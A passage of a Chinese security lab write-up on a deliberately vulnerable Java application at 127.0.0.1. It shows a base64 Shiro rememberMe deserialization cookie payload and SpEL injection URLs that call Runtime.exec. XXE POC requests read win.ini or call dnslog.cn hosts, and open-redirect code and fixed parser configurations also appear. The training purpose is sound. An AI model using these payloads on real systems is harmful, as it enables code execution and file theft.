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
```

发送 cookie 请求

```
Cookie: 
rememberMe=AAAAAAAAAAAAAAAAAAAAAJE6IN+YLEO/t7NuQvYGo54pFMPmAy1jLjUdyV2cc+dKJ0aTntr18Yzsis+1QzDVvl+rnlJLeWPJuL0cSfWAzo+2No6vA3hYfiyY7N7bIdaAAkxZxFdOGUyPMfG4Vp2mmHjn+yS1RXTT9F5R0sGFblDzzZz+nZQsajao/gdRfw9LcryTLP6L34t9wsvsXnBU1VSf5hQbAnLNK8U6tmS8mE71BGg5DVxXjdaZ2Sktj6pGhYmrmySrHqvTuDxmZF+EgIA+g0SQMeALpCzmRK4j4Lmn3JQAqEAhglphaTt+2UB7rzvNBVbUGHx72GSISDEQiCBRjyufA+sziQUFYCP6DjWEjYOtXKTH+AKulse6AvZXu3Tkybnwa8ZPHPDQGT5b/pNB32K+ftJjsycsFSixp29sAnPqWZQ2c8pOTmznkkXlBdQTDTHtPhGTHntexCFgTHGiqALSXXHWSGmhn8WljmLUFsOLSCgEeWFPZt5uWX78goP5ZDwU/ZYGm5QyIgBBYjjYyuv6nYVZKYbH1A22Iy5sKFjbFXY3YyXWV3hLgmI801jgthjOt5G3iKXhUK557xmEXqe9gZamYVPMxKdIRdiU7fQMPH/7sVd8zAorKWwpoCxU9AedfAZbDFN0I3/gcYI0dAbQg9GyC9jMb5OiDIZE6sFd2XTSWbYQrdnePZe5gPjx8zlntQYl+7imK4pCFGgBIqX+1G0O0GvRIBoWUadk5KK8lm9J3aXjtfo25hFu6DnnPnDyRQnudEdQLjNqYpiIxJtNw/W0VgEmjpG2OsLRtsCRddr8/Vky+6t5i76oEqDU8iPh/Stjj9OfjfSNroe3B5Nbzzh1e0KWVoTPoNRc4d3THTBcaNeK3YnyTN3Ws+88WBG7vbFZF9Fj5GdksjEYcmRDnWbukoLJJH0diWwXT7cSKOdKqAsFQr0meXhGWvMAN1EP74/zvbXM/RpZZlefSQpfeh29D2wxaqdP2ydMTo+qixxTIIEspf4EFI3/vO+kPojn/GA+H38ovGW6reqxHXooV655jmV155px5BFR/MvklhgGyiSPVNoPL567alnOsfhd2R2h3/6VZv04uwu4p4dLa13EL9l+PEOXETpbLQEYmln707qD3+mx+lUD8HHusPJfVtI6CZPzceIdq/c347uFpGmvZv0fzulV2NuWKS2N5rsBmuUR/+RZR9Pdu65/KYqX85Fw1knJYNJF3wKT/uI8deF+D0b/Ib0rzkHWI2nFWQ24T+Zl1/DsEleOAe8KQaS6mfcbfHyyilY0tFL3dw2TmcFqToSoFeuJEGsAiRjM+1bp5TqJmfKUcnbDqLK4ybs+IlUh1ESSTFBiE7soFo9vytcu1l1Q4YL3OwbTLci2CpaugEF6ehkJrQ0a2JlTDScqxVGtkkT13p9+b5XShyLT83rSoVbQWfQuaWw0EIfaz295IzGjmo8F46mo2EJIB0HXbSiRusBU7x4xLgpjvZ5G8c7GkQNOfx96gGHYy6k+yoWcSKWWuKq7SVqgI8bKSDrGT25Ko8dPGpTYjQ5YyVw3PA2AU8VqdaUMWINPNMm5Aoi/AgzKBPup2b+3V618KprP6u029vuQoW9VysdJCsmA3MyCqQFvCGpaK0KbKWo+8ZGYqH4sPJH4xJe1SlocC+hJpR+o+AHmD1S7cESYzXXQMMThHbcP2XD84AUvHWCE2N4R8CJBWKn6WlXPQDgQPjt7EQIQVZFExgSY8M/D0o9vQYfxibUt+7RgHQ+4QrZvqxkR9YcdXldx+Fvhjwz/fgg/rktKZf6KChS7vLrZSoIOLeO6a1BVVp9TQKHix1wTs5rTiQyNEBL2q1ZpCIoEbEhRFHeynOgtTjzuUrYZkSZQJ7Llrd8MvejJqCZW9ooOP38g5jmK8tZMX1+G5N/o2X0cKdGWLrUx5SArOLo5tf7LnUF716la/EnO/sgvPAq2URt0umwmnldywDMZl0ZQVQwHySRrl+qbJEnSrdQAppjPtHI4lnW9+SrqIqPbcUieH6yWi0HRrQQXgUUSMgEO2LR/p9cbqG+ouAeLL2RVCUyscWdpbT2k1Ffjpxq98yp7iu0SQScOAmB6eLUBJueow1p+Jl1L5xakot4cpS5TNEiyzGVdNTVr/M9SFzyQTARtW4HdKZoVU2VUMIZUScaudUl+Jjvwi/0haRw/emevd/wjsxM0y7EWaLyjn0NjgXiLpGkEh433iyTBF+0U3j87DAYmA2KKWHsr2aXryYCjJHhKCHXCTq3sEn5OwshulkaeVZaxiCkFx0NeLa37v66DnyctyjVTTIV9nMhKLC62UVFzwkppxwt2RQAgo/YvJHZrhV4SPFgZQMt07yvTCGOhRsWYev+IwidIHrcefeYPDuWTXsO9LAZu9dUTu7R5pM7u7oKbBPpXYuqiCVOm5HQOUPbS/kmBxGFZcEQhP+hI0SliS7+D0Az3YfLHX59AFfRwAN/R1RXkscsUxZ5FT43IcXEFoEsC1rIK46TJWiZErGsPGLphxXsLVrAu/1IlrSbwLp/lUFtJLzmN9LemI2WM1mhn6SiO1QNWX79hSHZjAZTytzSpRXewdcPCmztKIyFZEYLPQlzZ5opck7Vb+3sxqRYjWucGEnVn8zKdUG/6XG3n1PXReOaXu8ZcK+XcdK57tAwiW2i/4ewrWv6wK3vIZ1S7SecN8Ff7Kg/mNVnAKFNVU/4YgI0hi1tgoou2k89ieMdayFpxQPrsTQHf8TTSsVKzGnU125XYarMHAosNLm9H6dkt09i5Qg72HT/wKq7vkZGOLQ4U9egq3FRsxDL9sq1BayxIqPAVcfjfQ7Ft+e4nYJ0GKANDc8Hv/4ij9qIjJ2rD6f0GUuU0rBS8xFVLenvKPUjneFgDcCtJ2ZmdZJGbH8Wget9lkEYp4ioMR7GSYIJ21bNAX/3imJ21yF2Qt74Gamc1972lYhOEtVWQeYwsW5AsDYIr9hVNysJvlXS6Wq2ear/vv0wALrp8De4IIuAhTxVUj4B2a8i7TcY1wl2UmPMfjnzEpKIQZAeJ96ESqYQSCNhH11NNdL6+Zg9kGqy2Q/bW/1nlTjg+dVs7bd8hq7ZEWo9qFNpCUg9ulN27sZA+nP6tlQYLioDJQtv0uos7EHkLrY63BAwE3yabrxn3RkLnk8arqkedmOag46+vydoiyqzDvka5HuZN7ntLTcggMo4lfG0MhTQji21qbky7zEZxeWty55t/UhCCLVQQsBQcu4v3M6eNe9maR985c1Nw7opVGKb9p1MAm7OCOq4Hkl4rwyWjroSXEaJpjQCdAiikTrMsIj2YDr5kIN79WEITTbBB6iMEimvXpqcy1nqqnNN3D4yKlf2zmwKpyvDYCoz71RCO+1P9O8Js3RftXHrHew2X/Y/2sGrn8YuxthTUBLhA7aF6+jMzVzBhmRygBcrx5E3zkOPIyDwP9jheD9ghHEBvCJE5Se3kXmcY0dsOVZWp1yCSQShAZL0dfCCCcLzG1V/ydV1Y3q8Jt5Q2KslxZkyF5gR94O3/46aqAXSCxyoxT3Sh/SFZ+wEOcI/XOqGrg9J82FnTBCvVOOvtV3mF0KC/p3TD8ARmpy1xE+1kt9C+CjYL+QAS/G/AppCDhNKAhH6K4gOnSv7XkvbGmw0L5lXj0jxLItOL13xZ6zU0dcDR8LwybZnZadALqTLpFHaBdDEms2QtRn8sIiXvvWqPZvKdbgw3MRcVtA==
```



![20250726132755476](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942029.png)





也可以利用工具：

![20250726133031514](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942947.png)



![20250726133042646](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942394.png)



![20250726133057346](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942506.png)



## SpEL

> Spring Expression Language 是一种表达式语言，支持运行时查询和操作对象图，同时也有方法调用和字符串模板功能
>
> SpEL使用 `#{...}` 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如：
>
> > 引用其他对象:`#{car}`
> > 引用其他对象的属性：`#{car.brand}`
> > 调用其它方法 , 还可以链式操作：`#{car.toString()}`
>
> 1.类类型表达式
>
> 使用`T()`运算符会调用类作用域的静态属性或静态方法，SpEL内置了`java.lang`包下的类声明，也就是说`java.lang.String`可以通过`T(String)`访问，而不需要使用全限定名
> 比如：
>
> ```
> T(Runtime).getRuntime().exec(\"open /Applications/Calculator.app\")
> ```
>
> 2.类实例化
> 使用new可以直接在SpEL中创建实例，需要创建实例的类要通过全限定名进行访问。
> 比如
>
> ```
> new java.util.Date()
> ```



```java
@RequestMapping("/spel/vuln1")
public String spel_vuln1(String value) {
    ExpressionParser parser = new SpelExpressionParser();
    return parser.parseExpression(value).getValue().toString();
}


@RequestMapping("spel/vuln2")
public String spel_vuln2(String value) {
    StandardEvaluationContext context = new StandardEvaluationContext();
    SpelExpressionParser parser = new SpelExpressionParser();
    Expression expression = parser.parseExpression(value, new TemplateParserContext());
    Object x = expression.getValue(context);    // trigger vulnerability point
    return x.toString();   // response
}
```







```
http://127.0.0.1:8081/spel/vuln1?value=T(java.lang.Runtime).getRuntime().exec('calc')
-> http://127.0.0.1:8081/spel/vuln1?value=T(java.lang.Runtime).getRuntime().exec(%27calc%27)
```

![20250726134132360](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942808.png)







```
http://127.0.0.1:8081/spel/vuln2?value=${T(java.lang.Runtime.getRuntime().exec('calc')}
-> http://127.0.0.1:8081/spel/vuln2?value=%24%7BT(java.lang.Runtime.getRuntime().exec(%27calc%27)%7D
```

![20250726133936240](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942479.png)





## URLRedirect

url重定向漏洞主要用来钓鱼，重定向跳转代码

```java
//直接拼接 url 
@GetMapping("/redirect")
public String redirect(@RequestParam("url") String url) {
    return "redirect:" + url;
}

//设置任意重定向头，手动设置 Location 响应头
@RequestMapping("/setHeader")
    @ResponseBody
    public static void setHeader(HttpServletRequest request, HttpServletResponse response) {
        String url = request.getParameter("url");
        response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); // 301 redirect
        response.setHeader("Location", url);
    }

//用户控制跳转目标。自动设置状态码为 302 并写入 Location 头
@RequestMapping("/sendRedirect")
    @ResponseBody
    public static void sendRedirect(HttpServletRequest request, HttpServletResponse response) throws IOException {
        String url = request.getParameter("url");
        response.sendRedirect(url); // 302 redirect
    }
```



```
http://127.0.0.1:8081//urlRedirect/redirect?url=http://www.baidu.com
```

![20250726134558956](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080943493.png)



![20250726134611955](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080943956.png)





## URLWhiteList

```Java
@GetMapping("/vuln/url_bypass")
public void url_bypass(String url, HttpServletResponse res) throws IOException {

    logger.info("url:  " + url);

    //检查 url 是否是以 http:// 或 https:// 开头
    if (!SecurityUtil.isHttp(url)) {
        return;
    }

    URL u = new URL(url);
    //从 URL 对象中获取域名部分
    String host = u.getHost();
    logger.info("host:  " + host);

    //遍历配置的域名白名单 domainwhitelist
    // endsWith .
    for (String domain : domainwhitelist) {
        if (host.endsWith("." + domain)) {
            res.sendRedirect(url);
        }
    }

}
```



```java
    URL u = new URL(url);
```

- 创建一个 Java 标准库的 `URL` 对象，用于解析 `url` 字符串的结构。
- 比如：
   `url = "https://www.example.com:8080/path?q=1"`
   则：
  - `u.getHost()` = `"www.example.com"`
  - `u.getPort()` = `8080`
  - `u.getPath()` = `"/path"`



## XXE

>
>
>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。
>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成**任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击**等危害。
>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。

### 1./xmlReader/vuln

```java
@PostMapping("/xmlReader/vuln")
public String xmlReaderVuln(HttpServletRequest request) {
    try {
        String body = WebUtils.getRequestBody(request);
        logger.info(body);
        XMLReader xmlReader = XMLReaderFactory.createXMLReader();
        xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml
        return "xmlReader xxe vuln code";
    } catch (Exception e) {
        logger.error(e.toString());
        return EXCEPT;
    }
}
```

没有禁用 `DOCTYPE` 与实体相关的 SAX 特性

> SAX（Simple API for XML）解析器是一种基于事件驱动的解析方式，用于处理XML文档。与DOM解析器不同，SAX不需要将整个文档加载到内存中，因此对于大型文件尤其有用。



POC:

```
POST /xxe/xmlReader/vuln HTTP/1.1
Host: 127.0.0.1:8081
Content-Type: application/xml
Content-Length: 198  可以不写
Connection: close
        此处空一行 分隔 Header 与 Body 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">  
]>
<root>
    <name>&xxe;</name>
</root>
或
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://1izyf3.dnslog.cn">
]>
<root>
  <name>&xxe;</name>
</root>
```



抓包 `http://127.0.0.1:8081/xxe/xmlReader/vuln`

![20250727115850184](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080943742.png)



修改为 POST 提交

```
POST /xxe/xmlReader/vuln HTTP/1.1
Host: 127.0.0.1:8081
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0
Content-Type: application/xml
Content-Length: 198
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root>
  <name>&xxe;</name>
</root>
```



已经触发了 XML 解析逻辑，但是没有读取文件

![20250727120554070](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944650.png)



换一种：

```
POST /xxe/xmlReader/vuln HTTP/1.1
Host: 127.0.0.1:8081
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0
Content-Type: application/xml
Content-Length: 198
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://1izyf3.dnslog.cn">
]>
<root>
  <name>&xxe;</name>
</root>
```



说明服务端 确实解析并触发了外部实体加载，访问了构造的恶意 URL

![20250727121029322](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944167.png)

![20250727121019973](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944742.png)

### 2./xmlReader/sec

```java
@RequestMapping(value = "/xmlReader/sec", method = RequestMethod.POST)
public String xmlReaderSec(HttpServletRequest request) {
    try {
        String body = WebUtils.getRequestBody(request);
        logger.info(body);

        XMLReader xmlReader = XMLReaderFactory.createXMLReader();
        // fix code start
        xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
        xmlReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        //fix code end
        xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml

    } catch (Exception e) {
        logger.error(e.toString());
        return EXCEPT;
    }

    return "xmlReader xxe security code";
}
```

修改后的方法禁用 `DOCTYPE` 声明，禁用外部实体（GENERAL + PARAMETER）



### 3./SAXBuilder/vuln

```java
@RequestMapping(value = "/SAXBuilder/vuln", method = RequestMethod.POST)
public String SAXBuilderVuln(HttpServletRequest request) {
    try {
        String body = WebUtils.getRequestBody(request);
        logger.info(body);

        //创建一个 JDOM2 的 SAXBuilder 实例，它用于将 XML 字符串解析成一个 JDOM Document 对象
        SAXBuilder builder = new SAXBuilder();
        // org.jdom2.Document document
        builder.build(new InputSource(new StringReader(body)));  // cause xxe
        return "SAXBuilder xxe vuln code";
    } catch (Exception e) {
        logger.error(e.toString());
        return EXCEPT;
    }
}
```

`SAXBuilder` 默认开启了对 **外部实体** 的支持

POC:

```
POST /xxe/SAXBuilder/vuln  HTTP/1.1
Host: 127.0.0.1:8081
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0
Content-Type: application/xml
Content-Length: 150
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://v50sch.dnslog.cn">
]>
<root>
  <name>&xxe;</name>
</root>

```

![20250727122448607](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944871.png)

![20250727122444351](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944391.png)

### 4./SAXBuilder/sec

```Java
@RequestMapping(value = "/SAXBuilder/sec", method = RequestMethod.POST)
public String SAXBuilderSec(HttpServletRequest request) {
    try {
        String body = WebUtils.getRequestBody(request);
        logger.info(body);

        SAXBuilder builder = new SAXBuilder();
        //禁止 DOCTYPE 声明。
        builder.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        //禁止解析 外部通用实体 <!ENTITY xxe SYSTEM "file:///etc/passwd">
        builder.setFeature("http://xml.org/sax/features/external-general-entities", false);
        //禁止解析 外部参数实体
        builder.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        // org.jdom2.Document document
        builder.build(new InputSource(new StringReader(body)));

    } catch (Exception e) {
        logger.error(e.toString());
        return EXCEPT;
    }

    return "SAXBuilder xxe security code";
}
```

### 5./SAXReader/vuln

```java
@RequestMapping(value = "/SAXReader/vuln", method = RequestMethod.POST)
public String SAXReaderVuln(HttpServletRequest request) {
    try {
        String body = WebUtils.getRequestBody(request);
        logger.info(body);

        SAXReader reader = new SAXReader();
        // org.dom4j.Document document
        reader.read(new InputSource(new StringReader(body))); // cause xxe

    } catch (Exception e) {
        logger.error(e.toString());
        return EXCEPT;
    }

    return "SAXReader xxe vuln code";
}
```

POC:

```
POST /xxe/SAXReader/vuln HTTP/1.1
Host: 127.0.0.1:8081
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0
Content-Type: application/xml
Content-Length: 150
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://f89q97.dnslog.cn">
]>
<root>
  <name>&xxe;</name>
</root>
```





![20250727123019413](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944246.png)

![20250727123025939](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080945207.png)



### 6./SAXReader/sec

```java
@RequestMapping(value = "/SAXReader/sec", method = RequestMethod.POST)
public String SAXReaderSec(HttpServletRequest request) {
    try {
        String body = WebUtils.getRequestBody(request);
        logger.info(body);

        SAXReader reader = new SAXReader();
        reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
        reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        // org.dom4j.Document document
        reader.read(new InputSource(new StringReader(body)));
    } catch (Exception e) {
        logger.error(e.toString());
        return EXCEPT;
    }
    return "SAXReader xxe security code";
}
```



### 7./SAXParser/vuln

```java
@RequestMapping(value = "/SAXParser/vuln", method = RequestMethod.POST)
public String SAXParserVuln(HttpServletRequest request) {
    try {
        String body = WebUtils.getRequestBody(request);
        logger.info(body);

        SAXParserFactory spf = SAXParserFactory.newInstance();
        SAXParser parser = spf.newSAXParser();
        parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml

        return "SAXParser xxe vuln code";
    } catch (Exception e) {
        logger.error(e.toString());
        return EXCEPT;
    }
}
```



POC:

```
POST /xxe/SAXParser/vuln HTTP/1.1
Host: 127.0.0.1:8081
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0
Content-Type: application/xml
Content-Length: 152
Connection: close

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://h1bdeh.dnslog.cn">
]>
<root>
  <name>&xxe;</name>
</root>

```



![20250727123517394](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080945564.png)



### 8./SAXParser/sec

```java
@RequestMapping(value = "/SAXParser/sec", method = RequestMethod.POST)
public String SAXParserSec(HttpServletRequest request) {
    try {
        String body = WebUtils.getRequestBody(request);
        logger.info(body);

        SAXParserFactory spf = SAXParserFactory.newInstance();
        spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        SAXParser parser = spf.newSAXParser();
        parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml
    } catch (Exception e) {
        logger.error(e.toString());
        return EXCEPT;
    }
    return "SAXParser xxe security code";
}
